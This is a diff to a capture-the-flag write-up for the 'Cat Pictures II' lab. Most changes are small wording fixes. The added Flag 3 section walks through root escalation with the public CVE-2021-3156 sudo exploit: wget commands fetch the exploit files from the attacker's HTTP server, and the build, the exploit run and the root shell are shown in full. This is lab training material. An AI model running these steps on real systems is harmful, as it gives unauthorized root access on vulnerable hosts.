@@ -16,11 +16,11 @@ PORT     STATE SERVICE REASON  VERSION
 ...
 ```
 
-Lychee is hosted on 10.10.158.237:80 , Gitea on port 3000 and OliveTin on port 1337
+Lychee is hosted on port 80 , Gitea on port 3000 and OliveTin on port 1337
 
 ## Flag 1
 
-head over to 10.10.158.237:80 and check the images. Description of the first images says "note to self: strip metadata". Download the imnage and run exfitool on it.
+head over to 10.10.158.237:80 and check the images. Description of the first images says "note to self: strip metadata". Download the image and run exfitool on it.
 
 ```
  kewl@h4x0r > ~/Desktop/leet/l > exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg | grep Title
@@ -50,7 +50,7 @@ The user owns a private repo with the name "ansible"
 
 ## Flag 2
 Now lets check ansible runner (olivetin) at port 1337.
-Click on "Run Ansible Playbook" and wait for it to finish and check the logs<br>
+Click on "Run Ansible Playbook" and wait for it to finish, then check the logs<br>
 ![](2.png)
 
 There is user named "bismuth". lets check if this user has a ssh key.<br>
@@ -89,3 +89,61 @@ bismuth@catpictures-ii:~$ cat flag2.txt
 ```
 
 ## Flag 3
+On running linpeas, I noticed that the sudo binary is outdated and we can get root by running the exploit for CVE-2021-3156<br>
+![](4.png)<br>
+The exploit can be found here : https://github.com/blasty/CVE-2021-3156<br>
+Clone it onto your host machine and start SimpleHTTP server<br>
+![](5.png)
+
+Download the files onto the remote machine
+```bash
+bismuth@catpictures-ii:~$ wget http://[HOST IP]:8000/brute.sh
+.
+.
+bismuth@catpictures-ii:~$ wget http://[HOST IP]:8000/hax.c
+.
+.
+bismuth@catpictures-ii:~$ wget http://[HOST IP]:8000/lib.c
+.
+.
+bismuth@catpictures-ii:~$ wget http://[HOST IP]:8000/Makefile
+.
+.
+bismuth@catpictures-ii:~$ make
+rm -rf libnss_X
+mkdir libnss_X
+gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
+gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
+bismuth@catpictures-ii:~$ ./sudo-hax-me-a-sandwich
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+  usage: ./sudo-hax-me-a-sandwich <target>
+
+  available targets:
+  ------------------------------------------------------------
+    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
+    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
+    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
+  ------------------------------------------------------------
+
+  manual mode:
+    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
+
+bismuth@catpictures-ii:~$ ./sudo-hax-me-a-sandwich 0
+
+** CVE-2021-3156 PoC by blasty <peter@haxx.in>
+
+using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
+** pray for your rootshell.. **
+[+] bl1ng bl1ng! We got it!
+# whoami
+root
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1000(bismuth)
+# cd /root
+# ls
+ansible  docker-compose.yaml  flag3.txt  gitea
+# cat flag3.txt           
+[REDACTED]
+```
